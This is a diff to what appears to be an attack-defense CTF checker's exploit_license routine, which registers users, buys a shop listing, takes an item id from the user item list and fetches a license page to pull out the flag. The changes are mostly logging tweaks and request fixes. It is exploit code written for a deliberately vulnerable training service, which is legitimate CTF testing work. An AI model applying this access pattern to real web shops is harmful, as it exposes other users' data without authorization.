@@ -291,13 +291,12 @@ async def exploit_license(task: ExploitCheckerTaskMessage, searcher: FlagSearche
 
     response = await client.get(f"shop/item/{attack_info}/")
    
-    logger.debug(f"EXPLOIT_LICENSE - get shop_item: {response.text}")
+    #logger.debug(f"EXPLOIT_LICENSE - get shop_item: {response.text}")
     data = BeautifulSoup(response.text,'html.parser')
     name = data.find_all('h3')
-    logger.debug(f"EXPLOIT_LICENSE - name: {name}")
     item_name = str(name[0])[32:-5]
 
-   
+    logger.debug(f"EXPLOIT_LICENSE - item_name: {item_name}")
     exploit_name = await make_item_name_exploitable(item_name)
     shop_item_kwargs =  {
         'data_path': '/frog.png',
@@ -313,32 +312,41 @@ async def exploit_license(task: ExploitCheckerTaskMessage, searcher: FlagSearche
         'item_id': item_id,
         'item_price': 1,
         'description': html.escape(gen.sentence()),
-        'username': user2['username'],
-        'password': user2['password1'],
+        'username': user1['username'],
+        'password': user1['password1'],
     }
     listing_id = await create_ShopListing(client=client,logger=logger,db=None,kwargs=shop_listing_kwargs)
     await logout_user(client=client,logger=logger,db=None,kwargs={'logged_in':True})
 
 
     user2 = await register_user(client=client,logger=logger,db=None,chain_id=None)
+    #http://localhost:8010/shop/item/purchase/8543
     try:
-        response = await client.get(f"shop/item/{listing_id}/",follow_redirects=True)
+        response = await client.get(f"shop/item/purchase/{listing_id}/",follow_redirects=True)
+    except RequestError:
+        raise MumbleException("EXPLOIT - cannot request endpoint!")
+    
+    try:
+        response = await client.get(f"user_items/",follow_redirects=True)
     except RequestError:
         raise MumbleException("EXPLOIT - cannot request endpoint!")
     
     data = BeautifulSoup(response,'html.parser')
     real_item_link = data.find_all('a')
+    #logger.debug(f"EXPLOIT_LICENSE - links: {real_item_link}")
     correct_link = ""
     for r_link in real_item_link:
       if item_name in str(r_link):
         correct_link = str(r_link)
         break
+    logger.debug(f"EXPLOIT_LICENSE - item_link {correct_link}")
     correct_item_id = correct_link.split('"')[1]
-
+    logger.debug(f"EXPLOIT_LICENSE - exploited_item_id {correct_item_id}")
     try:
         response = await client.get(f"user_items/license/{correct_item_id}/")
     except RequestError:
         raise MumbleException("EXPLOIT - cannot request endpoint!")
+    logger.debug(f"EXPLOIT_LICENSE - license_text: {response.text}")
 
     if flag := searcher.search_flag(response.text):
         return flag
